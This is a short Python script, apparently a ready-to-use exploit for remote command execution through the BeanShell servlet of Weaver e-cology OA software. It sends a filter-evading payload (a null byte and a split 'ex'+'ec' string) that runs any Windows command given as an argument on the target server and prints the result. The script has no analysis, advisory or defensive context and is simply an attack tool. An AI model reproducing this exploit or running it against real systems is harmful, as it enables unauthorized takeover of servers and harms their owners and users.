#!/usr/bin/env python
import requests
import sys
 
headers = {
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 12_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/12.0 Safari/1200.1.25',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
    'Accept-Language': 'zh-CN,zh;q=0.9',
    'Content-Type': 'application/x-www-form-urlencoded'
}
 
def exploit(url,cmd):
    target=url+'/weaver/bsh.servlet.BshServlet'
    payload='bsh.script=eval%00("ex"%2b"ec(\\"cmd+/c+{}\\")");&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw'.format(cmd)
    res=requests.post(url=target,data=payload,headers=headers,timeout=10)
    res.encoding=res.apparent_encoding
    print(res.text)
 
if __name__ == '__main__':
    url=sys.argv[1]
    cmd=sys.argv[2]
    exploit(url,cmd)
